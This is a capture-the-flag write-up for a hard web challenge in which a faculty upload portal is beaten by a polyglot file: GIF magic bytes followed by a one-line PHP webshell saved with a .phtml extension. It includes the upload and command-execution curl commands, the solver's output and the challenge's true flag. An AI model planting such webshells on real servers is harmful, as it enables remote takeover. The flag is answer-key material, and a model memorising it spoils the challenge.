# PHP2SHELL: Faculty Upload Portal Bypass
## Challenge Writeup & Author Rationale
**Author:** Tanish Shah (`@tanishshahh`)  
**Track:** Web & AI (Issue #6 / Challenge #15)  
**Category:** Web  
**Difficulty:** Hard (500 pts, Dynamic initial: 500, decay: 15, minimum: 100)  
**True Flag:** `case{php_webshell_rce_faculty_portal}`  

---

### 1. Narrative Lore & Storyline Context
In GICT Lab 207, Prof. Hasmukh Chelaiya set up an internal submission portal (`upload.php`) to collect assignment drafts and exam review questions. TA Piyush Pelaiya discovered that the server hosting this portal stored the upcoming **OOP 99** midterm exam flag in `/flag.txt`. By finding an insecure file upload flaw in the portal, Piyush managed to execute commands on the server to read and leak the confidential flag.

---

### 2. Challenge Concept & Vulnerability Mechanics

#### A. Insecure File Upload & Flawed Blacklist
The application attempts to block malicious PHP uploads using an extension blacklist:
```python
DISALLOWED_EXTENSIONS = [".php", ".php3", ".php4", ".php7", ".exe", ".sh", ".bat"]
```
However, in web servers running PHP FastCGI or Apache configurations, alternative executable extensions like `.phtml`, `.php5`, and `.phar` are parsed and executed by the PHP engine.

#### B. Anti-AI Defensive Layer (Polyglot Magic Bytes)
Generic AI prompts or standard copy-paste webshells will fail against this challenge because the upload handler enforces a dual-layer check:
1. **MIME-Type Validation:** The uploaded multipart header `Content-Type` must be an accepted document or image MIME (e.g. `image/gif`, `image/png`, `application/pdf`).
2. **File Header Signature Validation:** The first bytes of the file are inspected against authentic magic signatures:
   - GIF: `GIF89a` or `GIF87a`
   - PNG: `\x89PNG\r\n\x1a\n`
   - PDF: `%PDF-`

If any raw script without valid magic bytes is uploaded, the server throws:
> `SIGNATURE MISMATCH: File header verification failed!`

#### C. The Solution: Crafting a Polyglot Webshell
By prepending valid GIF magic bytes (`GIF89a;`) to the PHP script and using an alternative extension (`.phtml`), the file satisfies all checks:
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```
When accessed at `/uploads/shell.phtml?cmd=cat /flag.txt`, the PHP parser ignores the leading non-PHP characters and executes the command parameter, returning the flag.

---

### 3. Step-by-Step Solution Walkthrough

#### Step 1: Craft the Polyglot Payload
Create a local file named `shell.phtml`:
```bash
echo -e 'GIF89a;\n<?php system($_GET["cmd"]); ?>' > shell.phtml
```

#### Step 2: Upload via Browser or `curl`
Using `curl`:
```bash
curl -F "submission=@shell.phtml;type=image/gif" http://<LAN_IP>:5003/upload
```
The server will respond:
```html
SUBMISSION SUCCESSFUL: File saved as: shell.phtml
Access link: /uploads/shell.phtml
```

#### Step 3: Trigger Command Execution to Retrieve Flag
Open the file in the browser or via `curl`:
```bash
curl "http://<LAN_IP>:5003/uploads/shell.phtml?cmd=cat%20/flag.txt"
```
Output:
```
case{php_webshell_rce_faculty_portal}
```

---

### 4. Verification & Testing
Run the automated solver script:
```bash
python challenges/php2shell/solve.py http://127.0.0.1:5003
```
Expected output:
```
[*] Verifying Extension Blacklist (.php rejection)...
[+] Standard .php upload blocked correctly.
[*] Verifying Signature & Magic Bytes Validation...
[+] Stock webshell without magic bytes was rejected properly.
[*] Uploading Valid Polyglot Webshell (.phtml + GIF89a; magic bytes)...
[+] Polyglot file accepted by server.
[*] Executing command via uploaded webshell (?cmd=cat /flag.txt)...
[+] Flag extracted successfully: case{php_webshell_rce_faculty_portal}
[SUCCESS] PHP2SHELL verification checks passed cleanly (Exit 0).
```
